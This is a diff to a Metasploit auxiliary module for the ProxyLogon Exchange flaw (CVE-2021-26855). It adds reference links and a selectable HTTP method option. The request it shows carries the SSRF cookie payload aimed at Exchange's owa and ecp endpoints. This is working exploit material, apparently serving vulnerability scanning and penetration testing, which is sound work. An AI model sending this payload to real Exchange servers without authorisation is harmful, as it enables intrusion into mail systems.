@@ -29,7 +29,9 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'References'     => [
         ['CVE', '2021-26855'],
-        ['URL', 'https://proxylogon.com/']
+        ['URL', 'https://proxylogon.com/'],
+        ['URL', 'https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse'],
+        ['URL', 'http://aka.ms/exchangevulns']
       ],
       'DisclosureDate' => '2021-03-02',
       'License'        => MSF_LICENSE,
@@ -41,13 +43,17 @@ class MetasploitModule < Msf::Auxiliary
         'AKA'          => ['ProxyLogon']
       }
     ))
+
+    register_options([
+      OptEnum.new('METHOD', [true, 'HTTP Method to use (for CVE-2021-26855).', 'POST', ['GET', 'POST']])
+    ])
   end
 
   def run_host(target_host)
     uri = normalize_uri('owa', 'auth', 'x.js')
 
     received = send_request_cgi(
-      'method' => 'POST',
+      'method' => datastore['METHOD'],
       'uri' => uri,
       'cookie' => 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'
     )
